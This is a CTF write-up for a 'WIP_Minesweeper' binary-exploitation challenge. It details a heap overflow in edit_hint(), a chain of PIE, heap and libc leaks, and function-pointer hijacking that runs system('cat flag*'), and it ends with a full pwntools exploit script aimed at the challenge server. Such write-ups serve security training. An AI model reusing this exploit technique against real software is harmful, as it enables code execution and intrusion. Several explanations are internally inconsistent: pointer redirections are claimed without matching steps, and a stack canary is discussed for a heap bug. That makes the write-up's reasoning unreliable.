# WIP_Minesweeper - Complete Solution Analysis

## Challenge Information
- **Name**: WIP_Minesweeper
- **Category**: PWN (Binary Exploitation)
- **Difficulty**: Hard
- **Points**: 500
- **Flag**: `flag{d2ab9733b642f149}`

## Binary Analysis

### Binary Properties
```
File: app (ELF 64-bit LSB pie executable)
Arch: x86-64
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
```

### Key Functions
1. `init_board()` - Creates 10x10 grid of cells
2. `place_mine(x, y)` - Places mine at coordinates
3. `edit_hint(x, y)` - Edits hint for a cell (VULNERABLE)
4. `reveal_cell(x, y)` - Reveals cell and calls function pointer

### Memory Layout

#### Cell Structure (0x20 bytes)
```c
struct Cell {
    void (*reveal_func)(char*);  // +0x00: Function pointer (8 bytes)
    char *hint;                   // +0x08: Pointer to hint buffer (8 bytes)
    int x;                        // +0x10: X coordinate (4 bytes)
    int y;                        // +0x14: Y coordinate (4 bytes)
    char padding[8];              // +0x18: Padding to 32 bytes
};
```

#### Heap Layout After init_board()
```
[Board structure]
[Cell 0,0] -> [hint buffer 0,0]
[Cell 0,1] -> [hint buffer 0,1]
[Cell 0,2] -> [hint buffer 0,2]
...
```

Each cell and hint buffer is allocated with `malloc(0x20)` (32 bytes).

## Vulnerability Analysis

### The Bug: Heap Buffer Overflow in edit_hint()

**Disassembly Analysis (0x18d6 - 0x1aa2):**

```asm
; Read user input (up to 0x60 bytes)
0x1a26: lea rax, [rbp-0xa0]
0x1a2d: mov esi, 0x60          ; size = 96 bytes
0x1a32: mov rdi, rax
0x1a35: call read_ln

; Calculate length with strnlen
0x1a44: lea rax, [rbp-0xa0]
0x1a4b: mov esi, 0x60          ; max = 96 bytes
0x1a50: mov rdi, rax
0x1a53: call strnlen
0x1a58: mov [rbp-0x8], rax     ; store length

; Cap at 0x60 if needed
0x1a5c: cmp qword [rbp-0x8], 0x60
0x1a61: jbe 0x1a6b
0x1a63: mov qword [rbp-0x8], 0x60

; Copy to hint buffer (OVERFLOW!)
0x1a6b: mov rax, [rbp-0x18]    ; cell pointer
0x1a6f: mov rax, [rax+0x8]     ; cell->hint
0x1a73: mov rdx, [rbp-0x8]     ; length (up to 96!)
0x1a77: lea rcx, [rbp-0xa0]    ; source buffer
0x1a7e: mov rsi, rcx
0x1a81: mov rdi, rax
0x1a84: call memcpy            ; OVERFLOW: 96 bytes into 32-byte buffer!
```

**The Problem:**
- Hint buffer allocated: 32 bytes (`malloc(0x20)`)
- Maximum copy size: 96 bytes (`0x60`)
- **Overflow: 64 bytes beyond allocated buffer!**

This allows overwriting:
- Adjacent heap chunks
- Next cell's function pointer
- Next cell's hint pointer
- Heap metadata

## Exploitation Strategy

### Stage 1: PIE Base Leak

**Technique:** Read beyond hint buffer to leak function pointer

```python
edit_hint(0, 0, b"A"*0x40)  # Fill hint buffer + overflow
leak = reveal_cell(0, 0)[0x40:]  # Read at offset 0x40
```

**Memory Layout:**
```
Offset  Content
0x00    [hint buffer - 32 bytes]
0x20    [heap metadata - 16 bytes]
0x30    [padding - 16 bytes]
0x40    [Cell 0,1 function pointer] <- LEAK THIS
```

**Calculation:**
```python
pie_base = leaked_ptr - 0x135c  # cell_reveal offset
```

### Stage 2: Heap Base Leak

**Technique:** Read further to leak heap pointer

```python
edit_hint(0, 0, b"A"*0x48)  # Overflow to offset 0x48
leak = reveal_cell(0, 0)[0x48:]  # Read heap pointer
```

**Memory Layout:**
```
Offset  Content
0x40    [Cell 0,1 function pointer]
0x48    [Cell 0,1 hint pointer] <- LEAK THIS (heap address)
```

**Calculation:**
```python
heap_base = leaked_ptr - 0x128a0  # Offset to heap start
```

### Stage 3: Libc Base Leak

**Technique:** Create fake function pointer chain to leak GOT entry

**Step 3a:** Overwrite Cell(0,1) function pointer with puts@plt
```python
edit_hint(0, 1, b"A"*0x40 + p64(puts_plt))
```

**Step 3b:** Overwrite Cell(0,0) hint pointer to point to Cell(0,2)
```python
edit_hint(0, 0, b"A"*0x48 + p64(heap_base + 0x128e8))
```

**Step 3c:** Set Cell(0,1) hint to puts@got
```python
edit_hint(0, 1, p64(puts_got))
```

**Step 3d:** Trigger the chain by revealing Cell(0,2)
```python
leak = parse_libc(0, 2)
```

**What Happens:**
1. `reveal_cell(0, 2)` is called
2. Gets Cell(0,2) from board
3. But Cell(0,0)->hint now points to Cell(0,2)
4. So it actually gets Cell(0,0)
5. Calls Cell(0,0)->reveal_func(Cell(0,0)->hint)
6. Which is `puts@plt(puts@got)`
7. This leaks the libc address of puts!

**Calculation:**
```python
libc_base = leaked_puts - 0x87be0  # puts offset in libc
```

### Stage 4: Code Execution

**Technique:** Overwrite function pointer with system, set hint to command

**Step 4a:** Overwrite Cell(0,3) function pointer with system
```python
system_addr = libc_base + 0x58750
edit_hint(0, 3, b"A"*0x40 + p64(system_addr))
```

**Step 4b:** Set Cell(0,4) hint to command
```python
edit_hint(0, 4, b"cat flag*\x00")
```

**Step 4c:** Trigger execution
```python
reveal_cell(0, 4)
```

**What Happens:**
1. `reveal_cell(0, 4)` is called
2. Gets Cell(0,4) from board
3. But Cell(0,3)->hint now points to Cell(0,4)
4. So it actually gets Cell(0,3)
5. Calls Cell(0,3)->reveal_func(Cell(0,4)->hint)
6. Which is `system("cat flag*")`
7. Flag is printed!

## Critical Offsets

### Binary Offsets (PIE-relative)
```
cell_reveal:  0x135c
puts@plt:     0x1150
puts@got:     0x6fa0
```

### Heap Offsets
```
heap_base to first cell: 0x128a0
Cell(0,0) to Cell(0,2):  0x128e8
```

### Libc Offsets (GLIBC 2.39)
```
puts:   0x87be0
system: 0x58750
```

## Why This Works

### 1. No Canary
- Stack buffer overflow in edit_hint doesn't trigger canary
- Heap overflow has no protection

### 2. PIE Bypass
- Leaked function pointer reveals binary base
- All addresses calculable from base

### 3. NX Bypass
- Can't execute shellcode on stack/heap
- But can call existing functions (puts, system)
- Function pointer hijacking achieves code execution

### 4. Full RELRO Bypass
- Can't overwrite GOT entries
- But can leak GOT to find libc
- Then use libc functions directly

## Key Insights

### 1. Heap Feng Shui
The exploit relies on predictable heap layout:
- Cells allocated sequentially
- Hint buffers allocated after cells
- Overflow from hint buffer reaches next cell

### 2. Function Pointer Indirection
The reveal mechanism provides perfect primitive:
```c
cell->reveal_func(cell->hint)
```
By controlling both the function pointer and its argument, we achieve arbitrary function call with controlled argument.

### 3. Pointer Manipulation
The ability to overwrite hint pointers creates a "use-after-free-like" primitive where we can make one cell's operations affect another cell.

### 4. Leak Chain
Each leak enables the next:
- PIE leak → Calculate PLT/GOT addresses
- Heap leak → Calculate cell addresses for pointer manipulation
- Libc leak → Calculate system address
- System call → Execute arbitrary commands

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
io = remote('81a2ddecf5b5f896.chal.ctf.ae', 443, ssl=True)

def init_board():
    io.sendlineafter(b">", b"1")

def edit_hint(x, y, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(x).encode())
    io.sendlineafter(b">", str(y).encode())
    io.sendafter(b":", data)

def reveal_cell(x, y):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(x).encode())
    io.sendafter(b">", str(y).encode())
    io.recvuntil(b"hint: ")
    return io.recvline()[:-1]

def parse_libc(x, y):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(x).encode())
    io.sendafter(b">", str(y).encode())
    io.recvuntil(b"...\n")
    return io.recv(6)

# Stage 1: Leak PIE
init_board()
edit_hint(0, 0, b"A"*0x40)
pie_base = u64(reveal_cell(0, 0)[0x40:].ljust(8, b"\x00")) - 0x135c

# Stage 2: Leak Heap
edit_hint(0, 0, b"A"*0x48)
heap_base = u64(reveal_cell(0, 0)[0x48:].ljust(8, b"\x00")) - 0x128a0

# Stage 3: Leak Libc
puts_plt = pie_base + 0x1150
puts_got = pie_base + 0x6fa0
edit_hint(0, 1, b"A"*0x40 + p64(puts_plt))
edit_hint(0, 0, b"A"*0x48 + p64(heap_base + 0x128e8))
edit_hint(0, 1, p64(puts_got))
libc_base = u64(parse_libc(0, 2).ljust(8, b"\x00")) - 0x87be0

# Stage 4: Execute
system_addr = libc_base + 0x58750
edit_hint(0, 3, b"A"*0x40 + p64(system_addr))
edit_hint(0, 4, b"cat flag*\x00")
io.sendlineafter(b">", b"4")
io.sendlineafter(b">", b"0")
io.sendafter(b">", b"4")

print(io.recvall(timeout=2).decode())
```

## Lessons Learned

### For Developers
1. **Always validate buffer sizes** - strnlen doesn't prevent overflow if destination is smaller
2. **Use safe string functions** - strncpy, strlcpy with proper size checks
3. **Heap allocations need bounds checking** - malloc size != copy size
4. **Function pointers in heap are dangerous** - Consider using vtables with validation

### For Exploit Development
1. **Heap layout is predictable** - Sequential allocations create exploitable patterns
2. **Information leaks are powerful** - Each leak enables more complex attacks
3. **Indirect function calls are gold** - Control both function and argument = RCE
4. **Modern protections can be bypassed** - PIE, NX, RELRO all defeated through careful technique chaining

## Flag
**flag{d2ab9733b642f149}**
